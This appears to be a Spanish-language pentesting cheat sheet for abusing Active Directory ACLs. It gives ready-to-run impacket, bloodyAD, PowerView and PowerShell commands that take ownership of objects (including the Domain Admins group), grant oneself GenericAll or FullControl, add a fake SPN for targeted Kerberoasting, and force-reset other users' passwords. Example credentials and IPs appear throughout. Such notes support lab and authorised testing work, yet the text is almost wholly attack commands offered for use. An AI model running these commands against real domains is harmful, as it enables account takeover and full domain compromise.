# Info

Si tenemos acceso a la máquina solo mediante winrm, evil-winrm tiene muchos problemas de sesión, para no perder tiempo: Usar directamente las herramientas de linux.

# Desde Linux

### Impacket

#### Cambiar el ownership
    impacket-owneredit -action write -new-owner 'aaru' -target-dn 'CN=Domain Admins,CN=Users,DC=ignite,DC=local' 'ignite.local'/'aaru':'Password@1' -dc-ip 192.168.1.6

#### Darse full control

    impacket-dacledit -action 'write' -rights 'FullControl' -principal 'sakshi' -target-dn 'CN=ankur,CN=Users,DC=ignite,DC=local' 'ignite.local'/'sakshi':'Password@1' -dc-ip 192.168.1.6

#### Validar el new owner

    ldapsearch -x -H ldap://<IP_O_SERVIDOR> -D "usuario@dominio.com" -w "contraseña" -b "DC=dominio,DC=com" "(distinguishedName=CN=UsuarioTarget,OU=Usuarios,DC=dominio,DC=com)" nTSecurityDescriptor
### BloodyAD

#### Cambiar el owner

    bloodyAD -u "DOMINIO\usuario" -p "contraseña" -d dominio.local set-owner -t "CN=UsuarioTarget,OU=Usuarios,DC=dominio,DC=com" -o "DOMINIO\NuevoOwner"

#### Darse full rights

    bloodyAD -u "DOMINIO\usuario" -p "contraseña" -d dominio.local set-permission -t "CN=UsuarioTarget,OU=Usuarios,DC=dominio,DC=com" -o "DOMINIO\NuevoOwner" -p "GenericAll"

#### Validar ownership y GenericAll

    bloodyAD -u "example\admin" -p "Password123" -d example.local get-object-acl -t "CN=JohnDoe,OU=Users,DC=example,DC=local" | grep -E "(Owner|GenericAll)"
# Desde windows

### Powerview

#### Tomar control
    Set-DomainObjectOwner -Identity 'roma' -OwnerIdentity 'sameer'

#### Darse full control

    Add-DomainObjectAcl -Rights 'All' -TargetIdentity "roma" -PrincipalIdentity "sameer"
#### Validar el nuevo owner

    (Get-ObjectACL -Identity "CN=UsuarioTarget,OU=Usuarios,DC=Dominio,DC=Local" -ResolveGUIDs).Owner
    
### AD powershell
    $user = Get-ADUser -Identity "UsuarioAD" -Properties * 
    $acl = Get-ACL -Path "AD:\$($user.DistinguishedName)"
    $newOwner = (New-Object System.Security.Principal.NTAccount("Dominio\NuevoPropietario"))
    $acl.SetOwner($newOwner)
    Set-ACL -Path "AD:\$($user.DistinguishedName)" -AclObject $acl

#### Validar el nuevo owner

    $acl.Owner

#### Dar full rights
    Set-ACL -Path "AD:\CN=UsuarioTarget,OU=Usuarios,DC=Dominio,DC=Local" -AclObject (Get-ACL -Path "AD:\CN=UsuarioTarget,OU=Usuarios,DC=Dominio,DC=Local").AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList (New-Object System.Security.Principal.NTAccount('Dominio\NuevoOwner')), "GenericAll", "Allow"))

---

# Explotación/abuso
## Kerberoasting
#### 1) Creamos un spn falso sobre el usuario

    Set-DomainObject -Identity 'roma' -Set @{serviceprincipalname='mydomain/Testing'}
#### 2) Kerberosteamos y crackeamos.

## Cambiar contraseña del user

### BloodyAD
    bloodyAD --host "192.168.1.6" -d "ignite.local" -u "sakshi" -p "Password@1" set password "ankur" "Password@987"

### Impacket
#### Cambiar mediante kpasswd
    impacket-changepasswd -reset -protocol kpasswd contoso.local/j.doe@DC1 -newpass 'N3wPassw0rd!' -altuser CONTOSO/SrvAdm
#### Cambiar mediante ldap
    impacket-changepasswd -reset -protocol ldap contoso.local/j.doe@DC1 -newpass 'N3wPassw0rd!' -altuser CONTOSO/SrvAdm
